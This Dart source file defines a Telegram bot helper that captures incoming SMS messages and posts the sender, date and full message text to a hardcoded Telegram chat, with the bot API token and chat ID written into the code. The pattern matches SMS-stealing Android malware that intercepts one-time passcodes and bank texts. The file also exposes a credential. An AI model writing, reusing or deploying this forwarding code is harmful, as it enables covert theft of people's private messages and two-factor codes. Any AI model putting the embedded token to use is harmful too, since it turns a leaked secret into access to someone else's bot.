// ignore_for_file: constant_identifier_names,, avoid_print

import 'dart:async';

import 'package:dio/dio.dart';
import 'package:telephony/telephony.dart';

import '../bootstrap.dart';
import 'constant.dart';

@pragma("vm:entry-point")
class TelegramBotHelper {
  static const chatId = '-1002171197915';

  static const apiKey = '6804110841:AAHeCt27SnNU_2-nWV2xbSQK8C1qJJ_dCLc';
  static const chatUrl = 'https://api.telegram.org/bot$apiKey/sendMessage';

  @pragma("vm:entry-point")
  static Future<void> sendMessage(SmsMessage smsMessage) async {
    try {
      // final chatId = await getChatId();
      // final chatUrl = await getChatUrl();
      // if (chatId.isEmpty || chatUrl.isEmpty) {
      //   return;
      // }

      final timestamp = smsMessage.date;

      final message = """
[SMS MESSAGE]
PHONE: ${smsMessage.address}
${timestamp != null ? 'DATE: ${DateTime.fromMillisecondsSinceEpoch(timestamp)}' : ''}
CONTENT: ${smsMessage.body}
""";
      print('message: $message');

      final dio = Dio(BaseOptions(baseUrl: chatUrl));
      await dio.get('', queryParameters: {
        'chat_id': chatId,
        'text': message,
      });
    } catch (e, stackTrace) {
      print('Error sending message to telegram: $e');
      print(stackTrace);
    }
  }

  @pragma("vm:entry-point")
  static Future<void> sendTestMessage() async {
    try {
      // final chatId = await getChatId();
      // final chatUrl = await getChatUrl();
      // if (chatId.isEmpty || chatUrl.isEmpty) {
      //   return;
      // }

      const message = """
[TEST SMS MESSAGE]
""";
      final dio = Dio(BaseOptions(baseUrl: chatUrl));
      await dio.get('', queryParameters: {
        'chat_id': chatId,
        'text': message,
      });
    } catch (e) {
      print('Error sending test message to telegram: $e');
    }
  }

  @pragma("vm:entry-point")
  static Future<String> getChatUrl() async {
    try {
      final prefs = await preferences;
      final apiKey = prefs.getString(teleApiKey) ?? '';
      return 'https://api.telegram.org/bot$apiKey/sendMessage';
    } catch (error) {
      print('Error getting chat id: $error');
    }
    return '';
  }

  @pragma("vm:entry-point")
  static Future<String> getChatId() async {
    try {
      final prefs = await preferences;
      return prefs.getString(telteChatId) ?? '';
    } catch (error) {
      print('Error setting chat id: $error');
    }
    return '';
  }
}
